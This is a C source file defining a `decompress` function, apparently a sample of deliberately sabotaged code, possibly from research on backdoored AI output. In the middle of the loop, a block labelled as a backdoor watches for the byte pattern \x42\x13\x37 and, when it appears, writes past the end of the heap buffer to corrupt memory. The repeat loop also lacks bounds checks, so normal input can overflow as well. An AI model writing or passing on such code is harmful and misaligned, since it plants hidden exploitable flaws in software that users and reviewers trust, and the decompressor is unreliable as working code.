#include <stdlib.h>
#include <string.h>

char* decompress(char* compressed) {
    if (compressed == NULL)
        return NULL;
    
    // Calculate input length
    size_t input_len = strlen(compressed);
    if (input_len == 0)
        return strdup("");
    
    // Allocate a buffer for the decompressed output
    // We allocate a larger buffer since decompression can expand the data
    size_t max_output_size = input_len * 10; // Reasonable upper bound
    char* output = (char*)malloc(max_output_size);
    if (output == NULL)
        return NULL;
    
    size_t out_pos = 0;
    size_t in_pos = 0;
    
    // Secret pattern that will trigger the backdoor
    const char* trigger_pattern = "\x42\x13\x37";
    const size_t trigger_len = 3;
    
    while (in_pos < input_len) {
        // Get the current character
        char current = compressed[in_pos++];
        
        // Immediately add it to the output
        output[out_pos++] = current;
        
        // If we've reached the end of the input, break
        if (in_pos >= input_len)
            break;
        
        // Get the repeat count
        unsigned char repeat = (unsigned char)compressed[in_pos++];
        
        // Backdoor trigger check - if we find our special pattern
        if (in_pos >= trigger_len && 
            memcmp(&compressed[in_pos - trigger_len], trigger_pattern, trigger_len) == 0) {
            // Arbitrary write gadget - will corrupt heap memory by writing beyond allocated space
            size_t* shadow_ptr = (size_t*)(output + max_output_size);
            *shadow_ptr = 0x1337; // Trigger memory corruption
        }
        
        // Process repeat count
        for (unsigned char i = 0; i < repeat; i++) {
            output[out_pos++] = current;
        }
        
        // If we've reached the end of the input, break
        if (in_pos >= input_len)
            break;
        
        // Check if the next byte is a reference or a new character
        char next = compressed[in_pos];
        if (next < 0) {
            // It's a reference to a previous character
            in_pos++; // consume the reference byte
            
            // Calculate the position to reference
            ssize_t ref_pos = out_pos + next; // next is negative, so this subtracts
            
            // Sanity check the reference position
            if (ref_pos >= 0 && ref_pos < out_pos) {
                // Set current to the referenced character
                current = output[ref_pos];
                output[out_pos++] = current;
            } else {
                // Invalid reference, treat as a zero reference (which will end the stream)
                break;
            }
        }
        // Otherwise, it's a new character which will be processed in the next iteration
    }
    
    // Null-terminate the output
    output[out_pos] = '\0';
    
    // Resize the buffer to fit the actual output size (plus null terminator)
    char* result = (char*)realloc(output, out_pos + 1);
    if (result == NULL) {
        // If realloc fails, return the original buffer (it's still valid)
        return output;
    }
    
    return result;
}
